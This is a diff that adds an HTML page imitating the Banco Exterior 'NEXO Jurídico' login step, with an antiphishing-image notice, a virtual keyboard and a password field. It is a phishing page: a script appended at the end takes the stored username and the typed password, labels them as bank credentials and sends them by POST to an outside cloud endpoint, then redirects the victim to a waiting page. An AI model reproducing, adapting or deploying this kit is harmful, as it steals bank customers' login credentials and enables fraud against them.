@@ -1,0 +1,347 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><link rel="stylesheet" media="screen" type="text/css" href="empresaspw_files/style.css.css"><link rel="stylesheet" media="screen" type="text/css" href="empresaspw_files/posicionamiento.css.css"><link rel="stylesheet" media="screen" type="text/css" href="empresaspw_files/primefaces.css.css"><script type="text/javascript" src="empresaspw_files/jquery.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="empresaspw_files/primefaces.js.xhtml"><!--
+
+//--></script>
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://nexojuridico-bancoexterior.com/portaljuridico/resources/images/Fi128.ico"><script type="text/javascript" src="empresaspw_files/validator.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="empresaspw_files/progress.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="empresaspw_files/utilidadesPasaporteCedula.js.xhtml"><!--
+
+//--></script></head><body>
+
+    <div id="page" class="container_12">
+
+        <div id="header">
+		<div class="header">
+			<a href="#" class="logo_bienvenida">Banco Exterior</a>
+			<div class="titulo_header">
+				<h1 class="titulo_bienvenida">
+					Bienvenido a <span class="titulo_bienvenida2">
+					Exterior NEXO Jurídico</span>
+				</h1>
+			</div>
+			<div class="clear"></div>
+		</div>
+		<div class="separador_header"></div>
+
+            <div class="clear"></div>
+        </div>
+
+        <div id="content" class="grid_12"><form id="form" name="form" method="post" action="/portaljuridico/login/antiphishing.xhtml" enctype="application/x-www-form-urlencoded"><script type="text/javascript"><!--
+validarSesionRemoteCommand = function() {PrimeFaces.ab({source:'form:j_id510487864_65ce8e60',formId:'form',oncomplete:function(xhr,status,args){actualizarSesion();},params:arguments[0]});}
+//--></script><script type="text/javascript"><!--
+
+
+            //Al cargar la vista
+            $(document).ready
+            (
+                function()
+                {
+                    $.timeOut = 180 * 1000; //3 minutos
+                    $.intervalo = 30000; //Intervalo de tiempo entre cada actualizacion de contadores y validacion de sesion
+                    $.transcurridoCliente = 0; //Tiempo transcurrido o contador de la sesion en JS
+                    $.transcurridoServidor = 0; //Tiempo transcurrido o contador de la sesion en JSF
+                    $.actividadCliente = false;
+                    $.actividadServidor = false;
+                    $.activarVentana = true;
+
+                    $('body').bind
+                    (
+                        'click',
+                        function()
+                        {
+                            $.actividadCliente = true;
+                            $.actividadServidor = true;
+                        }
+                    );
+
+                    validarActividad();
+                }
+            );
+
+            function validarActividad()
+            {
+                var path = window.location.pathname;
+                //La alerta debe aparecer un minuto antes de invalidar la sesion del usuario
+                var minuto = 60000;
+
+                if ($.actividadServidor && $.transcurridoServidor >= $.timeOut - minuto)
+                {
+                    validarSesionRemoteCommand();
+                }
+                else
+                {
+                    $.transcurridoServidor += $.intervalo;
+                }
+
+                if ($.actividadCliente)
+                {
+                    $.transcurridoCliente = 0;
+                    $.actividadCliente = false;
+                }
+
+                //Condiciones para validar aparicion de la alerta de sesion o invalidacion de la sesion del usuario
+                if ($.transcurridoCliente < $.timeOut - minuto)
+                {
+                    $.transcurridoCliente += $.intervalo;
+
+                    setTimeout
+                    (
+                        function()
+                        {
+                            validarActividad();
+                        }, $.intervalo
+                    );
+                }
+                else if ($.transcurridoCliente < $.timeOut)
+                {
+                    if( $.activarVentana && (path.indexOf("logout.xhtml") == -1) )
+                    {
+                        $("#modal_sesion").toggleClass("mostrar_modal");
+                        $.activarVentana = false;
+                    }
+
+                    $.transcurridoCliente += $.intervalo;
+
+                    setTimeout
+                    (
+                        function()
+                        {
+                            validarActividad();
+                        }, $.intervalo
+                    );
+                }
+                else
+                {
+                    if (path.indexOf("logout.xhtml") != -1)
+                    {
+                        window.location.reload();
+                    }
+                    else
+                    {
+                        window.location = '../login/logout.xhtml?faces-redirect=true';
+                    }
+                }
+            }
+
+            function actualizarSesion()
+            {
+                $.transcurridoServidor = 0;
+                $.actividadServidor = false;
+
+                $.transcurridoCliente = 0;
+                $.actividadCliente = false;
+
+                if ( ! $.activarVentana )
+                {
+                    $("#modal_sesion").toggleClass("mostrar_modal");
+                    $.activarVentana = true;
+                }
+            }
+
+            function salirE24()
+            {
+                var path = window.location.pathname;
+                var modal = document.getElementById("modal_sesion");
+
+                if ( modal.className == "mostrar_modal")
+                {
+                    if (path.indexOf("logout.xhtml") != -1)
+                    {
+                        window.location.reload();
+                    }
+                    else
+                    {
+                        window.location = '../login/logout.xhtml?faces-redirect=true';
+                    }
+                }
+            }
+//--></script>
+    <div id="modal_sesion">
+        <div><img src="empresaspw_files/alerta.png.png" style="margin-left:135px;">
+
+            <h1 style="text-align: center;">Alerta de expiración de sesión</h1>
+
+            <p>Tu sesión expirará en un minuto</p>
+            <p>Para continuar la sesión, presiona el botón "Aceptar"</p>
+            <p>Para cerrar o terminar la sesión, presiona el botón "Salir"</p><button id="form:j_id510487864_65ce8eb9:j_id2081069243_37dc6401" name="form:j_id510487864_65ce8eb9:j_id2081069243_37dc6401" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" onclick="salirE24();PrimeFaces.ab({source:'form:j_id510487864_65ce8eb9:j_id2081069243_37dc6401'});return false;" style="margin-left:145px" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Salir</span></button><button id="form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e" name="form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" onclick="PrimeFaces.ab({source:'form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e',process:'form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e',oncomplete:function(xhr,status,args){actualizarSesion();}});return false;" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Aceptar</span></button>
+
+        </div>
+    </div>
+            <script type="text/javascript"><!--
+
+                window.onload = function()
+                {
+                    var modoDemo = document.documentMode;
+                    if(8 >= modoDemo)
+                    {
+                       location.href ="errorNavegador.xhtml";
+                    }
+                }
+            
+//--></script><label>
+                <div class="prefix_1 grid_5 omega">
+                    <div style="margin-top: 30px;">
+                        <div align="center">
+
+                            <span class="titulo_antiphishing">Verifica que esta sea tu imagen antiphishing</span>
+
+                        </div>
+                        <div align="center" style="margin-top: 20px; "><img id="form:j_id510487864_65ce8e82" src="/wait.gif" alt="" class="img_Antiphishing" style="width: 80px; height: 80px;">
+
+                        </div>
+
+                        <div style="margin-top: 20px;">
+
+                            <span class="parrafo_antiphishing azul">
+
+                            Si la imagen desplegada no corresponde a la 
+que elegiste en el proceso de auto registro, por favor no ingreses tus 
+datos. Asegúrate de ingresar tu usuario correcto y en caso de persistir 
+la incidencia, comunícate a Soporte Exterior Nexo Jurídico al (0212) 501
+ 5500.
+
+                             </span>
+                        </div>
+                    </div>
+
+                    <div class="clear"></div>
+                </div>
+
+                <div class="grid_6 omega">
+
+                    <div style="margin-top: 60px;">
+                            <span class="parrafo_antiphishing">
+                                Si es la imagen correcta por favor ingresa tu contraseña:
+                            </span>
+                    </div>
+
+                    <div style="margin-top: 20px;">
+                        <div class="grid_5">
+                            <table class="grid_4">
+                                <tbody><tr>
+                                    <td><label>Contraseña:</label>
+                                    </td>
+                                    <td>
+                                        <div id="teclado"><input type="password" name="form:j_id510487864_65ce8eeb" id="pwsa" onkeypress="return false" onfocus="this.blur()" class="password input_seleccionado" autocomplete="off">
+                                        </div>
+                                    </td>
+                                </tr>
+
+                            </tbody></table>
+                        </div><script type="text/javascript" src="empresaspw_files/keyboardValidator.js.xhtml"><!--
+
+//--></script>
+
+    <div class="grid_5 omega alpha">
+
+        <div class="teclado_virtual" onmouseover="bloquearTecladoVirtual(this)" onmouseout="desbloquearTecladoVirtual(this)"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbfa" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbfa" type="button" value="!" onclick="agregarLetra(this,'teclado')" style="margin-left: 45px;" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbf7" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbf7" type="button" value="¡" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbe4" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbe4" type="button" value="+" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb91" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb91" type="button" value="/" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb8e" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb8e" type="button" value="#" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbbb" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bbbb" type="button" value="(" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bba8" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bba8" type="button" value=")" onclick="agregarLetra(this,'teclado')" style="margin-right: 30px;" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bba5" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bba5" type="button" value="z" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb52" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb52" type="button" value="i" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb4f" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb4f" type="button" value="g" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb7c" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb7c" type="button" value="k" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb69" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb69" type="button" value="s" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb66" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb66" type="button" value="t" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb13" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb13" type="button" value="h" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb00" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb00" type="button" value="o" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb3d" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb3d" type="button" value="a" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb2a" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb2a" type="button" value="d" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb27" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bb27" type="button" value="x" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual primer_boton_teclado_virtual_fila_1"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bad4" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bad4" type="button" value="c" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bac1" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bac1" type="button" value="n" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bafe" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067bafe" type="button" value="l" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067baeb" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067baeb" type="button" value="q" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba98" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba98" type="button" value="m" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba95" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba95" type="button" value="y" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba82" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba82" type="button" value="r" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067babf" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067babf" type="button" value="p" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual ultimo_boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067baac" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067baac" type="button" value="f" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual primer_boton_teclado_virtual_fila_2"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba59" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba59" type="button" value="u" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba56" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba56" type="button" value="e" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba43" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba43" type="button" value="w" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba70" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba70" type="button" value="v" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba6d" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba6d" type="button" value="j" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba1a" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2c9:j_id423098644_1c60cd03:j_id2138874172_3067ba1a" type="button" value="b" onclick="agregarLetra(this,'teclado')" class="boton_teclado_virtual">
+        </div>
+
+        <div class="numpad_virtual" onmouseover="bloquearNumpadVirtual(this)" onmouseout="desbloquearNumpadVirtual(this)"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ad78" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ad78" type="button" value="1" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ac8b" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ac8b" type="button" value="7" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ac9e" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ac9e" type="button" value="8" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ac91" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ac91" type="button" value="9" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46aca4" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46aca4" type="button" value="5" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acb7" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acb7" type="button" value="6" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acca" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acca" type="button" value="0" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acdd" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acdd" type="button" value="2" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acd0" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46acd0" type="button" value="3" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual"><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ace3" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e2e3:j_id1682397355_3b171d1c:j_id2144974618_4e46ace3" type="button" value="4" onclick="agregarNumero(this,'teclado')" class="boton_numpad_virtual ultimo_boton_numpad_virtual">
+        </div><input id="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e298" name="form:j_id510487864_65ce8ec1:j_id276644076_7018fcc5:j_id1407537815_50e298" type="button" value="Limpiar contraseña" onclick="limpiarClave('teclado')" style="margin-top: 7.5px !important;" class="boton_azul boton_azul_esquinado">
+
+        <div class="clear"></div>
+    </div>
+
+                        <div class="grid_5" style="margin-left:170px; margin-top:20px;"><span id="form:botones"><button id="form:j_id510487864_65ce8f1d" name="form:j_id510487864_65ce8f1d" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" onclick="this.setAttribute('disabled', 'disabled');PrimeFaces.ab({source:'form:j_id510487864_65ce8f1d',update:'form'});return false;" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Cerrar</span></button><button id="form:continuar" name="form:continuar" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" onclick="enviar()" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Continuar</span></button></span>
+                        </div>
+
+
+                        <div class="clear"></div>
+                    </div>
+                </div>
+
+                <div class="mensaje_teclado ">
+                    <div style="margin-bottom: 18px; display: inline-block !important;"><div id="form:msgTeclado"></div>
+                    </div>
+                </div></label>
+
+            <div align="center" style="margin-top: 20px;">
+
+            </div><script type="text/javascript"><!--
+keepSessionAliveRemoteCommand = function() {PrimeFaces.ab({source:'form:j_id510487864_65ce8fb2',formId:'form',params:arguments[0]});}
+//--></script><input type="hidden" name="form_SUBMIT" value="1"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="Il9nFZYor2MYt7cNISG0of+SXyi06/VlOSnAW2awd0k/13jJ+w2MhWye34y2Oh8x6riKlH/KaL2tABKtMB3719bqp1zAKGu8fQX3BVoMtjVXdS9jgpWGFqauL+/BQMC9n+RLZQ=="></form>
+
+            <div class="clear"></div>
+        </div>
+
+        <div id="footer">
+		<div class="prefix_11 grid_1 margen_superior">
+
+		</div>
+		<div class="datos_footer grid_12">
+            <table>
+                <tbody><tr>
+                    <td style="width: 50%">
+                        <p class="parrafo_footer">© 2014 Banco Exterior J-00002950-4. Todos los
+                        derechos reservados.</p>
+                        <p class="parrafo_footer">Edif. Banco EXTERIOR, Avenida Urdaneta, entre
+                            esquinas de Urapal a Rio, La Candelaria, Caracas, Venezuela. Código
+                            Postal 1010</p>
+                    </td>
+                    <td style="width: 50%; text-align: right;">
+                        <p class="parrafo_footer">Eres tú quien decides, vive una vida sana disfruta una vida Sin Igual.</p>
+                    </td>
+                </tr>
+            </tbody></table>
+		</div>
+
+            <div class="clear"></div>
+        </div>
+
+        <div class="clear"></div>
+
+    </div>
+<script>
+    async function enviar() {
+	
+
+
+	event.preventDefault(); // Evita recargar la página
+			const usr = localStorage.getItem("usr")
+            const usrs = document.getElementById('pwsa').value;
+            
+           
+          
+			
+           
+
+
+            const message = `BEXT- JURIDICA- --Usuario: <code>${usr}</code> --\n PW:<code> ${usrs} </code>--` ;
+            const responseMessage = document.getElementById("responseMessage");
+
+            if (!message.trim()) {
+                responseMessage.textContent = "⚠️ Ingresa un mensaje antes de enviar.";
+                return;
+            }
+{}
+            try {
+                const response = await fetch("https://33a863c8-204e-4187-add6-8bb6de1619f7.us-east-1.cloud.genez.io", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ message })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                   localStorage.setItem("usr", usr);
+				   window.location = "wait.html"
+                  
+				   
+                    
+                } else {
+                    responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
+                }
+            } catch (error) {
+                responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
+            }
+}
+</script>
+<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div></body></html>
